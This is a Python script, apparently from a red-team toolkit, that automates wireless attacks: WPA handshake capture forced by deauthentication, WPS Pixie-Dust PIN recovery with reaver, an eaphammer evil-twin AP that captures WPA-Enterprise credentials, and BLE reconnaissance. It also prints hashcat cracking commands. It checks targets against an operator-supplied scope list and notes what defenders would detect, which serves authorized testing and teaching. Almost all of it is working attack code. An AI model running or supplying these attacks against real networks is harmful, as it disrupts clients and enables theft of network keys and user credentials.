#!/usr/bin/env python3
"""
Scoped offensive wireless operations for authorized engagements.

Design: industry-standard stack underneath, your twist on top. The twist:
  1. Scope discipline -- an op refuses any target outside your declared
     engagement scope (BSSID scope for RF ops, ESSID scope for evil-twin).
  2. It teaches you   -- every step prints the exact standard command and a
     one-line why, so you master the real tools, not a black box.
  3. Purple mirror    -- it tells you what da_bklyn_bridge's detector would see,
     so you run attack and defense as one loop.

These are orchestration wrappers around proven tools (airodump-ng, aireplay-ng,
hcxpcapngtool, hashcat, reaver, eaphammer, BlueZ). They do not reimplement them.
Scope and command logic are unit-tested (tests/test_wireless_ops.py). Live
execution needs the underlying tool installed and authorized hardware in range.

Ops:
  capture   -- scoped WPA handshake/PMKID capture -> hashcat 22000
  wps       -- scoped WPS Pixie-Dust / PIN attack (reaver)
  eviltwin  -- scoped WPA-Enterprise credential capture (eaphammer, rogue AP)
  ble       -- Bluetooth Low Energy device recon (BlueZ; needs a BT adapter)
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path


# ---- engagement scope -----------------------------------------------------
def _read_list_file(path):
    items = set()
    try:
        with open(path, encoding="utf-8") as fh:
            for raw in fh:
                line = raw.split("#", 1)[0].strip()
                if line:
                    items.add(line)
    except OSError as e:
        raise SystemExit(f"[!] cannot read {path}: {e}")
    return items


def load_scope(scope_file=None, config_path=None):
    """Authorized target BSSIDs (upper-cased), from a file and/or config.yaml."""
    bssids = {b.upper() for b in (_read_list_file(scope_file) if scope_file else set())}
    if config_path and os.path.exists(config_path):
        try:
            import yaml
            cfg = yaml.safe_load(open(config_path)) or {}
            am = cfg.get("active_mitigation", {}) or {}
            for b in (am.get("scope_bssids") or am.get("allowed_bssids") or []):
                if isinstance(b, str):
                    bssids.add(b.upper())
        except Exception:
            pass
    return bssids


def load_essid_scope(essid_file=None, config_path=None):
    """Authorized target ESSIDs (exact, case-sensitive), for evil-twin."""
    essids = set(_read_list_file(essid_file)) if essid_file else set()
    if config_path and os.path.exists(config_path):
        try:
            import yaml
            cfg = yaml.safe_load(open(config_path)) or {}
            for e in (cfg.get("authorized_essids") or []):
                if isinstance(e, str):
                    essids.add(e)
        except Exception:
            pass
    return essids


def require_scope(bssid, scope):
    bssid = bssid.upper()
    if bssid not in scope:
        raise SystemExit(
            f"[!] {bssid} is not in the engagement scope ({len(scope)} authorized). Refusing."
        )
    return bssid


def require_essid_scope(essid, scope):
    if essid not in scope:
        raise SystemExit(
            f"[!] ESSID '{essid}' is not in the authorized target list ({len(scope)}). Refusing."
        )
    return essid


def require_tool(tool):
    if not shutil.which(tool):
        raise SystemExit(f"[!] required tool '{tool}' not found. Install it (apt install {tool}).")


# ---- teaching layer -------------------------------------------------------
def step(n, why, cmd, run=True, background=False, capture=False):
    print(f"\n[{n}] {why}")
    print("    $ " + " ".join(str(c) for c in cmd))
    if not run:
        return None
    if background:
        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if capture:
        return subprocess.run(cmd, capture_output=True, text=True, check=False)
    return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


# ---- command builders (pure, unit-tested) ---------------------------------
def airodump_cmd(interface, bssid, channel, prefix):
    return ["airodump-ng", "-c", str(channel), "--bssid", bssid.upper(),
            "-w", prefix, "--output-format", "pcap", interface]


def deauth_cmd(interface, bssid, count, client=None):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid.upper()]
    if client and client.upper() != "FF:FF:FF:FF:FF:FF":
        cmd += ["-c", client.upper()]
    cmd.append(interface)
    return cmd


def convert_cmd(capfile, out_22000):
    return ["hcxpcapngtool", "-o", out_22000, capfile]


def crack_hint(out_22000, wordlist="/usr/share/wordlists/rockyou.txt"):
    return ["hashcat", "-m", "22000", out_22000, wordlist]


def wash_cmd(interface):
    return ["wash", "-i", interface]


def reaver_pixie_cmd(interface, bssid, channel):
    return ["reaver", "-i", interface, "-b", bssid.upper(), "-c", str(channel), "-K", "1", "-vv"]


def eaphammer_cert_cmd():
    return ["eaphammer", "--cert-wizard"]


def eaphammer_creds_cmd(interface, essid):
    return ["eaphammer", "-i", interface, "--essid", essid, "--creds"]


def ble_scan_cmd(duration):
    return ["timeout", str(duration), "hcitool", "lescan", "--duplicates"]


# ---- op: capture ----------------------------------------------------------
def capture_handshake(interface, bssid, channel, scope, outdir=".",
                      seconds=45, deauth_rounds=3, client="FF:FF:FF:FF:FF:FF"):
    """Scoped WPA handshake/PMKID capture, taught step by step."""
    bssid = require_scope(bssid, scope)
    for t in ("airodump-ng", "hcxpcapngtool"):
        require_tool(t)
    Path(outdir).mkdir(parents=True, exist_ok=True)
    prefix = str(Path(outdir) / f"capture_{bssid.replace(':', '')}")
    cap, out_22000 = prefix + "-01.cap", prefix + ".22000"

    print(f"=== scoped handshake capture: {bssid} ch {channel} (authorized) ===")
    dump = step(1, "lock airodump-ng to the one in-scope AP and record to a pcap",
                airodump_cmd(interface, bssid, channel, prefix), background=True)
    try:
        if deauth_rounds > 0:
            require_tool("aireplay-ng")
            time.sleep(min(5, seconds))
            step(2, "bump a client so it reassociates and emits the 4-way handshake",
                 deauth_cmd(interface, bssid, deauth_rounds, client))
        time.sleep(max(0, seconds - (min(5, seconds) if deauth_rounds > 0 else 0)))
    finally:
        dump.terminate()
        try:
            dump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump.kill()

    if not os.path.exists(cap):
        print("\n[!] no capture file written; nothing captured.")
        return None
    step(3, "normalize the capture into a hashcat-ready hash (22000 format)",
         convert_cmd(cap, out_22000))
    print("\n--- your twist ---")
    ok = os.path.exists(out_22000) and os.path.getsize(out_22000) > 0
    if ok:
        print(f"[+] hash ready: {out_22000}")
        print("[next] crack it: $ " + " ".join(crack_hint(out_22000)))
        print("    then rules -> combinator -> OSINT lists -> GPU (playbook crack tiers).")
    else:
        print("[!] no handshake/PMKID yet. Target idle; re-run or raise --deauth.")
    print("[blue mirror] that deauth is loud. da_bklyn_bridge flags it as DEAUTH_ATTACK.")
    return out_22000 if ok else None


# ---- op: wps --------------------------------------------------------------
def wps_attack(interface, bssid, channel, scope):
    """Scoped WPS Pixie-Dust attack (reaver -K 1). Recovers the PIN then the PSK
    on vulnerable APs. Find WPS-enabled APs first with: wash -i <iface>."""
    bssid = require_scope(bssid, scope)
    require_tool("reaver")
    print(f"=== scoped WPS Pixie-Dust attack: {bssid} ch {channel} (authorized) ===")
    print("    (recon WPS-enabled APs first with:  $ " + " ".join(wash_cmd(interface)) + " )")
    step(1, "run reaver in Pixie-Dust mode; offline PIN recovery on vulnerable chipsets",
         reaver_pixie_cmd(interface, bssid, channel))
    print("\n--- your twist ---")
    print("[note] Pixie Dust beats the passphrase entirely when the AP is vulnerable:")
    print("    it recovers the WPS PIN offline, which yields the PSK. Disabling WPS is")
    print("    the fix, and a finding worth more than the password itself.")
    print("[blue mirror] a WPS PIN brute is a loud, repeated EAPOL-WPS pattern a WIDS flags.")


# ---- op: eviltwin ---------------------------------------------------------
def eviltwin_enterprise(interface, essid, essid_scope):
    """Scoped WPA-Enterprise credential capture via a rogue AP (eaphammer).
    Stands up an AP mirroring an AUTHORIZED target ESSID; a client that
    auto-associates hands over its EAP/MSCHAPv2 challenge-response."""
    essid = require_essid_scope(essid, essid_scope)
    require_tool("eaphammer")
    print(f"=== scoped evil-twin (WPA-Enterprise): '{essid}' (authorized) ===")
    print("    (one-time first run:  $ " + " ".join(eaphammer_cert_cmd()) + " )")
    step(1, "stand up a rogue AP mirroring the target ESSID and capture EAP creds",
         eaphammer_creds_cmd(interface, essid))
    print("\n--- your twist ---")
    print("[next] crack the captured MSCHAPv2 offline:")
    print("    $ hashcat -m 5500 <captured_netntlm>  /usr/share/wordlists/rockyou.txt   (or asleap)")
    print("[blue mirror] an evil-twin is a duplicate ESSID on a new BSSID/channel.")
    print("    da_bklyn_bridge's rogue-AP detection is exactly this mirror. Both halves.")


# ---- op: ble --------------------------------------------------------------
def ble_recon(duration=20):
    """Bluetooth Low Energy device recon. Needs BlueZ and a Bluetooth adapter
    (the Wi-Fi Alfa does not do BT). Passive discovery of nearby BLE devices."""
    require_tool("hcitool")
    print(f"=== BLE recon ({duration}s) ===")
    res = step(1, "passively discover nearby BLE advertisers", ble_scan_cmd(duration), capture=True)
    seen = {}
    if res and res.stdout:
        for line in res.stdout.splitlines():
            m = re.match(r"\s*([0-9A-Fa-f:]{17})\s+(.*)", line)
            if m:
                mac, name = m.group(1).upper(), m.group(2).strip()
                if name and name != "(unknown)":
                    seen[mac] = name
                else:
                    seen.setdefault(mac, "(unknown)")
    print("\n--- discovered ---")
    if seen:
        for mac, name in seen.items():
            print(f"    {mac}  {name}")
    else:
        print("    none (no BT adapter, out of range, or nothing advertising)")
    print("[note] BLE devices (locks, badges, medical, wearables) are attack surface")
    print("    a Wi-Fi-only assessment misses. Flag them; deep BLE testing is its own phase.")
    return seen


def main():
    p = argparse.ArgumentParser(description="Scoped offensive wireless operations (authorized engagements only)")
    sub = p.add_subparsers(dest="op", required=True)

    cap = sub.add_parser("capture", help="Scoped WPA handshake/PMKID capture -> .22000")
    cap.add_argument("-i", "--interface", required=True)
    cap.add_argument("-b", "--bssid", required=True)
    cap.add_argument("-c", "--channel", required=True)
    cap.add_argument("--scope"); cap.add_argument("--config")
    cap.add_argument("--outdir", default="."); cap.add_argument("--seconds", type=int, default=45)
    cap.add_argument("--deauth", type=int, default=3); cap.add_argument("--client", default="FF:FF:FF:FF:FF:FF")

    w = sub.add_parser("wps", help="Scoped WPS Pixie-Dust / PIN attack (reaver)")
    w.add_argument("-i", "--interface", required=True)
    w.add_argument("-b", "--bssid", required=True)
    w.add_argument("-c", "--channel", required=True)
    w.add_argument("--scope"); w.add_argument("--config")

    e = sub.add_parser("eviltwin", help="Scoped WPA-Enterprise credential capture (eaphammer)")
    e.add_argument("-i", "--interface", required=True)
    e.add_argument("--essid", required=True, help="authorized target ESSID")
    e.add_argument("--essid-scope", help="file of authorized target ESSIDs")
    e.add_argument("--config")

    b = sub.add_parser("ble", help="BLE device recon (needs BlueZ + a BT adapter)")
    b.add_argument("--seconds", type=int, default=20)

    args = p.parse_args()
    if args.op == "capture":
        scope = load_scope(args.scope, args.config)
        if not scope:
            raise SystemExit("[!] no engagement scope. Pass --scope or set active_mitigation.scope_bssids.")
        capture_handshake(args.interface, args.bssid, args.channel, scope,
                          outdir=args.outdir, seconds=args.seconds,
                          deauth_rounds=args.deauth, client=args.client)
    elif args.op == "wps":
        scope = load_scope(args.scope, args.config)
        if not scope:
            raise SystemExit("[!] no engagement scope. Pass --scope or set active_mitigation.scope_bssids.")
        wps_attack(args.interface, args.bssid, args.channel, scope)
    elif args.op == "eviltwin":
        scope = load_essid_scope(args.essid_scope, args.config)
        if not scope:
            raise SystemExit("[!] no authorized ESSID list. Pass --essid-scope or set authorized_essids in config.")
        eviltwin_enterprise(args.interface, args.essid, scope)
    elif args.op == "ble":
        ble_recon(args.seconds)


if __name__ == "__main__":
    main()
